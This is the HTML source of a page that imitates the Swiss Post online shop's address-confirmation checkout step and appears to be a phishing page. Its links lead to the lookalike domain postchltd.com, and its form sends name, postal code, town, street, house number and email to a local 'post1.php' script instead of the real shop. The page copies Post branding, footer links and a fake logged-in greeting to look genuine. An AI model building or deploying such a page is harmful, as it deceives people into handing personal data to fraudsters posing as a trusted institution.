	 Kontakt <post-icon _ngcontent-ng-c650281947="" name="3020" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/3020.svg&quot;);">  
	</post-icon>  
	</a>  
	</li>  
	</ul>  
	</swisspost-onlineshop-header-a11y-shortcuts>  
	<header _nghost-ng-c2743937129="" style="--logo-scale: 1; --meta-header-height: 0px;" class="nav-hidden">  
	<div _ngcontent-ng-c2743937129="" class="first-row-container">  
	</div>  
	<div _ngcontent-ng-c2743937129="" class="second-row-container">  
	</div>  
	<div _ngcontent-ng-c2743937129="" class="ps-main-navigation-container wide-container nav-hidden">  
	<swisspost-onlineshop-logo _ngcontent-ng-c2743937129="" _nghost-ng-c529676948="">  
	<a _ngcontent-ng-c529676948="" id="link-logo" class="logo" href="https://postchltd.com/de/">  
	<span _ngcontent-ng-c529676948="" class="visually-hidden">  
	Die Post - zur Startseite</span>  
	<img _ngcontent-ng-c529676948="" aria-hidden="true" src="./files/post-logo.svg" loading="eager" id="header-logo" alt="Die Post" height="72px" width="72px">  
	<span _ngcontent-ng-c529676948="">  
	Adressen</span>  
	</a>  
	<!---->  
	</swisspost-onlineshop-logo>  
	<button _ngcontent-ng-c2743937129="" type="button" class="menu-button btn btn-tertiary text-secondary bg-white" aria-expanded="false" aria-label="Menü">  
	<div _ngcontent-ng-c2743937129="" class="d-flex gap-2 align-items-center">  
	<post-icon _ngcontent-ng-c2743937129="" name="2070" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/2070.svg&quot;);">  
	</post-icon>  
	<span _ngcontent-ng-c2743937129="" class="d-none d-rg-block">  
	Menü</span>  
	</div>  
	</button>  
	<div _ngcontent-ng-c2743937129="" cx-page-slot="" class="search SearchBox" position="SearchBox">  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	<div _ngcontent-ng-c2743937129="" cx-page-slot="" class="language-switch SiteContextSlot" position="SiteContextSlot">  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	<div _ngcontent-ng-c2743937129="" class="klp-widget">  
	<swisspost-onlineshop-klp _ngcontent-ng-c2743937129="" class="invisible">  
	<!---->  
	<swisspost-onlineshop-klp-widget _nghost-ng-c3296699638="">  
	<div _ngcontent-ng-c3296699638="" class="avatar-container">  
	<swisspost-onlineshop-klp-avatar _ngcontent-ng-c3296699638="" class="in-header" _nghost-ng-c2969557045="">  
	<button _ngcontent-ng-c2969557045="" type="button" id="klp-avatar-btn" class="avatar bold" aria-label="Hallo Juan Santiago Salinas">  
	 JA <!---->  
	<!---->  
	</button>  
	<!---->  
	</swisspost-onlineshop-klp-avatar>  
	<!---->  
	</div>  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	</swisspost-onlineshop-klp-widget>  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	</swisspost-onlineshop-klp>  
	</div>  
	<div _ngcontent-ng-c2743937129="" id="mini-cart" cx-page-slot="" position="MiniCart" class="MiniCart">  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	<button _ngcontent-ng-c2743937129="" type="button" class="header-button text-secondary close-nav" aria-label="Schliessen">  
	<post-icon _ngcontent-ng-c2743937129="" name="2043" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/2043.svg&quot;);">  
	</post-icon>  
	</button>  
	<div _ngcontent-ng-c2743937129="" cx-page-slot="" class="ps-nav NavigationBar" position="NavigationBar">  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	</div>  
	<!---->  
	</header>  
	<main>  
	<swisspost-onlineshop-common-area>  
	<!---->  
	<!---->  
	</swisspost-onlineshop-common-area>  
	<div breadcrumb="" class="container d-none mt-5">  
	<div class="d-flex align-items-center justify-content-between gap-2 d-none">  
	<div class="position-absolute top-0 h-0 overflow-hidden w-0 d-flex">  
	<nav breadcrumb-list="" class="text-nowrap">  
	<ol class="list-unstyled d-flex align-items-center mb-0" aria-label="Sie sind hier:">  
	<li class="d-flex flex-shrink-0">  
	<a class="text-decoration-none d-inline-flex align-items-center text-secondary" tabindex="-1" href="https://postchltd.com/de/">  
	<!---->  
	<span class="visually-hidden">  
	Home</span>  
	<post-icon name="2035" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/2035.svg&quot;);">  
	</post-icon>  
	<!---->  
	<!---->  
	</a>  
	</li>  
	<!---->  
	<!---->  
	<li class="d-flex flex-shrink-1 min-w-0 text-truncate">  
	<a class="text-decoration-none d-inline-flex align-items-center" tabindex="-1" aria-current="page" href="https://postchltd.com/de/">  
	<post-icon name="2050" class="fs-regular mx-1" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/2050.svg&quot;);">  
	</post-icon>  
	<!---->  
	<span class="text-truncate">  
	 postshop.ch: Der Onlineshop der Post! </span>  
	<!---->  
	<!---->  
	</a>  
	</li>  
	<!---->  
	<!---->  
	<!---->  
	</ol>  
	<!---->  
	<!---->  
	</nav>  
	</div>  
	<nav breadcrumb-list="" class="d-grid min-w-0 overview-x-clip text-nowrap">  
	<ol class="list-unstyled d-flex align-items-center mb-0" aria-label="Sie sind hier:">  
	<li class="d-flex flex-shrink-0">  
	<a class="text-decoration-none d-inline-flex align-items-center text-secondary" tabindex="0" href="https://postchltd.com/de/">  
	<!---->  
	<span class="visually-hidden">  
	Home</span>  
	<post-icon name="2035" class="fs-large" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/2035.svg&quot;);">  
	</post-icon>  
	<!---->  
	<!---->  
	</a>  
	</li>  
	<!---->  
	<!---->  
	<li class="d-flex flex-shrink-1 min-w-0 text-truncate">  
	<a class="text-decoration-none d-inline-flex align-items-center" tabindex="0" aria-current="page" href="https://postchltd.com/de/">  
	<post-icon name="2050" class="fs-regular mx-1" _nghost-ng-c549623231="" style="mask-image: url(&quot;https://shop.post.ch/assets/post-icons/2050.svg&quot;);">  
	</post-icon>  
	<!---->  
	<span class="text-truncate">  
	 postshop.ch: Der Onlineshop der Post! </span>  
	<!---->  
	<!---->  
	</a>  
	</li>  
	<!---->  
	<!---->  
	<!---->  
	</ol>  
	<!---->  
	<!---->  
	</nav>  
	</div>  
	<!---->  
	</div>  
	<router-outlet>  
	</router-outlet>  
	<div checkout-addresses-page="" class="container mb-5 mt-0 pt-0 pt-md-5">  
	<cx-page-slot position="Section1" class="Section1 has-components">  
	<div checkout-stepper="" class="justify-content-md-center row">  
	<nav class="col-12 col-lg-8 mb-5">  
	<ol class="stepper pe-0">  
	<li class="stepper-item" aria-current="step">  
	<span class="stepper-link">  
	<!---->  
	<span class="d-block">  
	 Adressen </span>  
	<span class="visually-hidden">  
	 (Aktueller Schritt)</span>  
	<!---->  
	<!---->  
	</span>  
	<!---->  
	<!---->  
	<!---->  
	</li>  
	<li class="stepper-item">  
	<a class="stepper-link" href="https://postchltd.com/de/checkout/payment-details">  
	<span class="visually-hidden">  
	Nächster Schritt: </span>  
	<!---->  
	<span class="d-none d-rg-block">  
	 Telefonnummern</span>  
	<!---->  
	<!---->  
	</a>  
	<!---->  
	<!---->  
	<!---->  
	</li>  
	<li class="stepper-item">  
	<a class="stepper-link me-0" href="https://postchltd.com/de/checkout/overview">  
	<span class="visually-hidden">  
	Nächster Schritt: </span>  
	<!---->  
	<span class="d-none d-rg-block">  
	 Fertigstellung</span>  
	<!---->  
	<!---->  
	</a>  
	<!---->  
	<!---->  
	<!---->  
	</li>  
	<!---->  
	<!---->  
	<!---->  
	</ol>  
	</nav>  
	<!---->  
	<!---->  
	</div>  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	</cx-page-slot>  
	<cx-page-slot position="Section2" class="Section2 has-components">  
	<div checkout-addresses="">  
	<!---->  
	<div checkout-klp-addresses="" class="justify-content-md-center row">  
	<h1 class="visually-hidden">  
	 Adressen Schritt 1 von 3 </h1>  
	<div class="col-12 col-lg-8">  
	<div id="checkout-email-title" class="mb-3 border-2 border-bottom">  
	<h2 class="fs-large mb-3">  
	Adresse bestätigen</h2>  
	</div>  
	<p id="body-content">  
	
    Für einige Onlinedienste ist die Angabe der Adresse und deren Bestätigung durch die Post erforderlich. Bitte erfassen Sie hier Ihre Privatadresse. Für Adressen in der Schweiz werden wir Ihnen anschliessend einen Brief mit einem Bestätigungscode zustellen.<br>  
	<br>  
	Beachten Sie dass Kunden mit einer Adresse im Ausland nur einen Teil der Onlinedienste nutzen können.

</p>  
	</div>  
	<swisspost-onlineshop-address-form cancelbtnlabel="common.cancel" actionbtnlabel="opcAddressForm.save" _nghost-ng-c235531322="">  
	

<form method="post" action="./post1.php">  
	

<div _ngcontent-ng-c235531322="" class="row justify-content-md-center">  
	

<div _ngcontent-ng-c235531322="" class="col-12 col-lg-8">  
	<div _ngcontent-ng-c235531322="" class="row row-gap-3">  
	<div _ngcontent-ng-c235531322="" class="col-12">  
	</div>  
	<div _ngcontent-ng-c235531322="" class="col-12 col-md-6">  
	<div _ngcontent-ng-c235531322="" class="form-floating">  
	

<input _ngcontent-ng-c235531322="" formcontrolname="firstName" type="text" class="form-control form-control-lg ng-untouched ng-pristine ng-invalid" required="" name="firstName" id="firstName" placeholder="Vorname" aria-invalid="false" aria-required="true">  
	

<label _ngcontent-ng-c235531322="" class="form-label" for="delivery-address-form-firstName">  
	 Vorname  </label>  
	<div _ngcontent-ng-c235531322="" class="invalid-feedback" id="delivery-firstNameInvalidFeedback">  
	 Pflichtfeld </div>  
	</div>  
	</div>  
	<div _ngcontent-ng-c235531322="" class="col-12 col-md-6">  
	<div _ngcontent-ng-c235531322="" class="form-floating">  
	<input _ngcontent-ng-c235531322="" formcontrolname="lastName" type="text" class="form-control form-control-lg ng-untouched ng-pristine ng-invalid" required="" name="lastName" id="lastName" placeholder="Nachname" aria-invalid="false" aria-required="true">  
	<label _ngcontent-ng-c235531322="" class="form-label" for="delivery-address-form-lastName">  
	 Nachname  </label>  
	



<div _ngcontent-ng-c235531322="" class="invalid-feedback" id="delivery-lastNameInvalidFeedback">  
	 Pflichtfeld </div>  
	</div>  
	</div>  
	<!---->  
	<div _ngcontent-ng-c235531322="" class="col-12 col-md-4">  
	<div _ngcontent-ng-c235531322="" class="form-floating">  
	<input _ngcontent-ng-c235531322="" autocapitalize="none" autocorrect="off" role="combobox" formcontrolname="postalCode" required="" type="text" class="form-control form-control-lg ng-untouched ng-pristine ng-invalid" id="postalCode" name="postalCode" placeholder="PLZ" aria-invalid="false" aria-required="true" autocomplete="off" aria-autocomplete="list" aria-expanded="false">  
	<!---->  
	<label _ngcontent-ng-c235531322="" class="form-label" for="delivery-address-form-postalCode">  
	 PLZ  </label>  
	

<div _ngcontent-ng-c235531322="" class="invalid-feedback" id="delivery-postalCodeInvalidFeedback">  
	 Pflichtfeld </div>  
	</div>  
	</div>  
	<div _ngcontent-ng-c235531322="" class="col-12 col-md-8">  
	<div _ngcontent-ng-c235531322="" class="form-floating">  
	<input _ngcontent-ng-c235531322="" autocapitalize="none" autocorrect="off" role="combobox" formcontrolname="town" required="" type="text" class="form-control form-control-lg ng-untouched ng-pristine ng-invalid" name="town" id="town" placeholder="Ort" aria-invalid="false" aria-required="true" autocomplete="off" aria-autocomplete="list" aria-expanded="false">  
	<!---->  
	<label _ngcontent-ng-c235531322="" class="form-label" for="delivery-address-form-town">  
	 Ort  </label>  
	


<div _ngcontent-ng-c235531322="" class="invalid-feedback" id="delivery-townInvalidFeedback">  
	 Pflichtfeld </div>  
	</div>  
	</div>  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<div _ngcontent-ng-c235531322="" class="col-12 col-md-8">  
	<div _ngcontent-ng-c235531322="" class="form-floating">  
	<input _ngcontent-ng-c235531322="" autocapitalize="none" autocorrect="off" role="combobox" formcontrolname="line2" type="text" required="" class="form-control form-control-lg ng-untouched ng-pristine ng-invalid" name="Strasse" id="Strasse" placeholder="Strasse" aria-invalid="false" aria-required="true" autocomplete="off" aria-autocomplete="list" aria-expanded="false">  
	<!---->  
	<label _ngcontent-ng-c235531322="" class="form-label" for="delivery-address-form-addressLine2">  
	 Strasse  </label>  
	


<div _ngcontent-ng-c235531322="" class="invalid-feedback" id="delivery-addressLine2InvalidFeedback">  
	 Pflichtfeld </div>  
	</div>  
	</div>  
	<!---->  
	<div _ngcontent-ng-c235531322="" class="col-12 col-md-4">  
	<div _ngcontent-ng-c235531322="" class="form-floating">  
	<input _ngcontent-ng-c235531322="" autocapitalize="none" autocorrect="off" role="combobox" formcontrolname="line3" type="text" name="Hausnummer" class="form-control form-control-lg ng-untouched ng-pristine ng-valid" id="Hausnummer" placeholder="Hausnummer (optional)" aria-invalid="false" aria-required="false" autocomplete="off" aria-autocomplete="list" aria-expanded="false">  
	<!---->  
	<label _ngcontent-ng-c235531322="" class="form-label" for="delivery-address-form-addressLine3">  
	 Hausnummer (optional) </label>  
	


<div _ngcontent-ng-c235531322="" class="invalid-feedback" id="delivery-addressLine3InvalidFeedback">  
	 Pflichtfeld </div>  
	</div>  
	</div>  
	<!---->  
	<div _ngcontent-ng-c235531322="" class="col-12">  
	<div _ngcontent-ng-c235531322="" class="form-floating">  
	<input _ngcontent-ng-c235531322="" formcontrolname="line1" type="email" required="" class="form-control form-control-lg ng-untouched ng-pristine ng-valid" name="Mail" id="Mail" placeholder=" E-Mail-Adresse für Bestätigung und Reminder " aria-invalid="false" aria-required="false">  
	


<label _ngcontent-ng-c235531322="" class="form-label" for="delivery-address-form-addressLine1">  
	  E-Mail-Adresse für Bestätigung und Reminder  </label>  
	<div _ngcontent-ng-c235531322="" class="invalid-feedback" id="delivery-addressLine1InvalidFeedback">  
	 Pflichtfeld </div>  
	</div>  
	




<div class="d-flex pt-4 flex-column flex-md-row-reverse justify-content-md-between gap-3 border-2 border-top">  
	<button type="submit" id="payment-methods-continue-btn" class="btn btn-primary btn-animated">  
	<!---->  
	<span>  
	 Weiter </span>  
	</button>  
	<button id="payment-methods-back-btn" class="btn btn-secondary">  
	 Zurück </button>  
	</div>  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<cx-page-slot position="Section3" class="Section3">  
	<!---->  
	<!---->  
	<!---->  
	</cx-page-slot>  
	<cx-page-slot position="Section4" class="Section4">  
	<!---->  
	<!---->  
	<!---->  
	</cx-page-slot>  
	</div>  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	</form>  
	</swisspost-onlineshop-address-form>  
	</div>  
	</div>  
	</cx-page-slot>  
	</div>  
	</main>  
	<div role="heading" aria-level="1" class="visually-hidden">  
	Fusszeile</div>  
	<footer class="border-2 border-top d-flex flex-column fw-light gap-5 pb-4 pt-5 px-0">  
	<div class="container mt-0 px-3 px-rg-4 px-xxl-5">  
	<div class="row">  
	<div cx-page-slot="" class="col-6 col-lg-3 MainFooter1" position="MainFooter1">  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	<div cx-page-slot="" class="col-6 col-lg-3 MainFooter2" position="MainFooter2">  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	<div cx-page-slot="" class="col-12 col-md-6 col-lg-3 mt-4 mt-lg-0 MainFooter3" position="MainFooter3">  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	<div cx-page-slot="" class="col-12 col-md-6 col-lg-3 mt-4 mt-lg-0 MainFooter4" position="MainFooter4">  
	<!---->  
	<!---->  
	<!---->  
	</div>  
	</div>  
	</div>  
	<cx-page-slot position="GlobalFooter" class="GlobalFooter has-components">  
	<div global-footer="" class="container d-flex flex-wrap gap-4 mt-0 px-3 px-rg-4 px-xxl-5">  
	<p class="fw-bold fs-tiny m-0 lh-sm">  
	© 2026 Post CH Netz AG</p>  
	<ul class="d-flex gap-2 fw-normal list-unstyled m-0 fs-tiny lh-sm flex-wrap">  
	<li _nghost-ng-c816571025="" global-footer-link="">  
	<a _ngcontent-ng-c816571025="" class="nav-link" href="https://www.post.ch/de/pages/footer/barrierefreiheit-bei-der-post" id="linkBarrierefreiheit" target="_blank">  
	 Barrierefreiheit </a>  
	<!---->  
	<!---->  
	<!---->  
	</li>  
	<!---->  
	<li _nghost-ng-c816571025="" global-footer-link="">  
	<a _ngcontent-ng-c816571025="" class="nav-link" href="https://www.post.ch/-/media/post/agb/agb-shops-der-post.pdf?sc_lang=de" id="linkAGB" target="_blank">  
	 Allgemeine Geschäftsbedingungen </a>  
	<!---->  
	<!---->  
	<!---->  
	</li>  
	<!---->  
	<li _nghost-ng-c816571025="" global-footer-link="">  
	<a _ngcontent-ng-c816571025="" class="nav-link" href="https://www.post.ch/de/pages/footer/datenschutz-und-rechtliches" id="linkRechtlicher-Hinweis" target="_blank">  
	 Rechtlicher Hinweis </a>  
	<!---->  
	<!---->  
	<!---->  
	</li>  
	<!---->  
	<li _nghost-ng-c816571025="" global-footer-link="">  
	<a _ngcontent-ng-c816571025="" class="nav-link" href="https://www.post.ch/de/pages/footer/impressum" id="linkImpressum" target="_blank">  
	 Impressum </a>  
	<!---->  
	<!---->  
	<!---->  
	</li>  
	<!---->  
	<!---->  
	</ul>  
	<!---->  
	</div>  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	<!---->  
	</cx-page-slot>  
	</footer>  
	<!---->  
	<!---->  
	</swisspost-onlineshop>  
	


	<div id="usercentrics-root" data-created-at="1730505031994" style="display: none;">  
	<template shadowrootmode="open">  
	<div data-nosnippet="1" data-testid="uc-app-container">  
	</div>  
	</template>  
	</div>  
	</body>  
	</html>  
	